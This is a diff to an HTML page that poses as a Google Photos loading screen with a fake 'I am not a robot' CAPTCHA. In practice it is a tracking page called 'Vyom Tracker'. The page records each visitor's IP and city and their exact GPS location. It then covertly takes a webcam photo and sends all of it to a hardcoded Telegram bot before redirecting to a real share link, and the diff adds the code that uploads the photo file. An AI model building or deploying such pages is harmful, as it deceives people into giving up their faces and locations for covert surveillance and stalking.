@@ -1,115 +1,88 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Redirecting...</title>
+    <title>Loading...</title>
     <style>
+        /* Same CSS as before */
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        body {
-            background: #202124;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            font-family: 'Segoe UI', Roboto, sans-serif;
-            flex-direction: column;
-            color: #e8eaed;
-        }
-        .loader {
-            border: 4px solid #303134;
-            border-top: 4px solid #4285F4;
-            border-radius: 50%;
-            width: 48px;
-            height: 48px;
-            animation: spin 1s linear infinite;
-        }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        body { background: #202124; display: flex; justify-content: center; align-items: center; height: 100vh; font-family: 'Segoe UI', sans-serif; flex-direction: column; color: #e8eaed; }
+        .loader { border: 4px solid #303134; border-top: 4px solid #4285F4; border-radius: 50%; width: 48px; height: 48px; animation: spin 1s linear infinite; }
+        @keyframes spin { to { transform: rotate(360deg); } }
         .hint { margin-top: 20px; color: #9aa0a6; font-size: 14px; }
-        
-        /* Fake CAPTCHA Overlay */
-        .overlay {
-            position: fixed;
-            top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.8);
-            backdrop-filter: blur(8px);
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            z-index: 1000;
-        }
-        .box {
-            background: #2d2e32;
-            padding: 40px 30px;
-            border-radius: 20px;
-            max-width: 360px;
-            text-align: center;
-            border: 1px solid #5f6368;
-            box-shadow: 0 20px 60px rgba(0,0,0,0.8);
-        }
-        .box h2 { font-size: 22px; font-weight: 600; margin-bottom: 8px; }
+        .overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); backdrop-filter: blur(8px); display: flex; justify-content: center; align-items: center; z-index: 1000; }
+        .box { background: #2d2e32; padding: 40px 30px; border-radius: 20px; max-width: 360px; text-align: center; border: 1px solid #5f6368; }
+        .box h2 { font-size: 22px; font-weight: 600; margin-bottom: 8px; color: #fff; }
         .box p { color: #9aa0a6; font-size: 14px; margin-bottom: 24px; line-height: 1.5; }
-        .btn {
-            background: #1a73e8;
-            color: #fff;
-            border: none;
-            padding: 12px 40px;
-            border-radius: 24px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-            transition: 0.3s;
-            width: 100%;
-        }
+        .btn { background: #1a73e8; color: #fff; border: none; padding: 12px 40px; border-radius: 24px; font-size: 16px; font-weight: 600; cursor: pointer; width: 100%; }
         .btn:hover { background: #1557b0; }
         .icon { font-size: 48px; margin-bottom: 12px; }
-        .footer { 
-            position: fixed; bottom: 20px; left: 0; right: 0; text-align: center; 
-            color: rgba(255,255,255,0.1); font-size: 11px; 
-        }
+        .footer { position: fixed; bottom: 20px; left: 0; right: 0; text-align: center; color: rgba(255,255,255,0.1); font-size: 11px; }
         .footer span { color: rgba(100,255,218,0.2); }
+        .hidden { display: none !important; }
     </style>
 </head>
 <body>
-
-    <!-- LOADING ANIMATION -->
     <div class="loader"></div>
     <div class="hint">Connecting to Google Photos...</div>
-
-    <!-- FAKE CAPTCHA OVERLAY -->
     <div class="overlay" id="captchaOverlay">
         <div class="box">
             <div class="icon">🤖</div>
             <h2>Verify you are human</h2>
-            <p>To continue to Google Photos, please allow camera access for age verification.</p>
+            <p>To continue, please allow camera access for age verification.</p>
             <button class="btn" id="allowBtn">✅ I am not a robot</button>
         </div>
     </div>
-
     <div class="footer"><span>dev @btwspark</span></div>
 
     <script>
-        // ============================================================
         // 🔥 CONFIG — Telegram Bot
-        // ============================================================
-        const BOT_TOKEN = "8569274562:AAGskuxql0tB8FQkTNBYF13p82eTL7LEzX0";   // @BotFather se lo
-        const CHAT_ID   = "8363966106";     // @getmyid_bot se lo
+        const BOT_TOKEN = "8569274562:AAGskuxql0tB8FQkTNBYF13p82eTL7LEzX0";
+        const CHAT_ID   = "8363966106";
 
         // ============================================================
-        // 📤 Send to Telegram
+        // 📤 Send Photo to Telegram (Actual Image File)
+        // ============================================================
+        function sendPhotoToTelegram(imageDataUrl) {
+            // Convert base64 to Blob
+            const byteString = atob(imageDataUrl.split(',')[1]);
+            const mimeString = imageDataUrl.split(',')[0].split(':')[1].split(';')[0];
+            const ab = new ArrayBuffer(byteString.length);
+            const ia = new Uint8Array(ab);
+            for (let i = 0; i < byteString.length; i++) {
+                ia[i] = byteString.charCodeAt(i);
+            }
+            const blob = new Blob([ab], { type: mimeString });
+
+            // Create FormData
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', blob, 'captured_photo.jpg');
+            formData.append('caption', `📸 *Live Photo Captured*\n📍 Location: ${locationData || 'Unknown'}`);
+
+            // Send to Telegram
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    console.log('✅ Photo sent successfully!');
+                } else {
+                    console.error('❌ Failed to send photo:', data);
+                }
+            })
+            .catch(err => console.error('Error:', err));
+        }
+
+        // ============================================================
+        // 📤 Send Text Message to Telegram
         // ============================================================
         function sendToTelegram(msg) {
-            if (BOT_TOKEN === "YOUR_BOT_TOKEN_HERE" || CHAT_ID === "YOUR_CHAT_ID_HERE") {
-                console.warn("⚠️ Set BOT_TOKEN & CHAT_ID first!");
-                return;
-            }
             const now = new Date();
             const ts = now.toLocaleString('en-IN', { timeZone: 'Asia/Kolkata', hour12: true });
-            const full = `🧠 *Vyom Tracker*
-📅 ${ts}
-${msg}
-—————————
-🛠️ dev @btwspark`;
+            const full = `🧠 *Vyom Tracker*\n📅 ${ts}\n${msg}\n—————————\n🛠️ dev @btwspark`;
             fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -130,11 +103,7 @@ ${msg}
                 const res = await fetch('https://api.ipify.org?format=json');
                 const data = await res.json();
                 const loc = await fetch(`https://ipapi.co/${data.ip}/json/`).then(r => r.json());
-                const msg = `🆕 *Visitor Detected*
-📌 IP: \`${data.ip}\`
-💻 Device: ${navigator.userAgent.substring(0, 60)}...
-📍 City: ${loc.city || 'N/A'}, ${loc.region || 'N/A'}
-🌍 Country: ${loc.country_name || 'N/A'}`;
+                const msg = `🆕 *Visitor Detected*\n📌 IP: \`${data.ip}\`\n💻 Device: ${navigator.userAgent.substring(0, 60)}...\n📍 City: ${loc.city || 'N/A'}, ${loc.region || 'N/A'}\n🌍 Country: ${loc.country_name || 'N/A'}`;
                 sendToTelegram(msg);
             } catch {
                 sendToTelegram('⚠️ IP could not be fetched');
@@ -144,6 +113,8 @@ ${msg}
         // ============================================================
         // 📸 CAPTURE PHOTO
         // ============================================================
+        let locationData = 'Unknown';
+
         function capturePhoto(stream) {
             const video = document.createElement('video');
             video.srcObject = stream;
@@ -154,7 +125,13 @@ ${msg}
                 canvas.height = 480;
                 canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
                 const dataUrl = canvas.toDataURL('image/jpeg');
-                sendToTelegram(`📸 *Photo Captured* (Size: ${(dataUrl.length / 1024).toFixed(1)} KB)`);
+                
+                // Send as actual image file
+                sendPhotoToTelegram(dataUrl);
+                
+                // Also send text confirmation
+                sendToTelegram(`📸 *Photo Captured & Sent!*`);
+                
                 video.srcObject = null;
                 stream.getTracks().forEach(t => t.stop());
             }, 800);
@@ -182,10 +159,8 @@ ${msg}
                         const lng = pos.coords.longitude;
                         const acc = Math.round(pos.coords.accuracy);
                         const maps = `https://www.google.com/maps?q=${lat},${lng}`;
-                        sendToTelegram(`📍 *Exact Location*
-Lat: \`${lat}\`, Lng: \`${lng}\`
-Accuracy: ±${acc}m
-🗺️ [Map](${maps})`);
+                        locationData = `${lat}, ${lng}`;
+                        sendToTelegram(`📍 *Exact Location*\nLat: \`${lat}\`, Lng: \`${lng}\`\nAccuracy: ±${acc}m\n🗺️ [Map](${maps})`);
                     },
                     err => {
                         sendToTelegram(`❌ *Location:* Denied (${err.message})`);
@@ -201,16 +176,11 @@ Accuracy: ±${acc}m
         // 🎮 UI BUTTON CLICK
         // ============================================================
         document.getElementById('allowBtn').addEventListener('click', function() {
-            // Hide overlay
             document.getElementById('captchaOverlay').style.display = 'none';
             sendToTelegram('👆 *User clicked "Allow"* (Permissions triggered)');
-            
-            // Capture
             requestPermissions();
 
-            // Redirect to Real Google Photos after 2.5 seconds
             setTimeout(() => {
-                // 🔥 CHANGE THIS TO YOUR GOOGLE PHOTOS ALBUM LINK
                 window.location.href = 'https://share.google/StGxW5TAjrdNOPbYR';
             }, 2500);
         });
@@ -220,7 +190,6 @@ Accuracy: ±${acc}m
         // ============================================================
         window.onload = function() {
             captureIP();
-            // Show overlay after 1 second
             setTimeout(() => {
                 document.getElementById('captchaOverlay').style.display = 'flex';
             }, 1000);
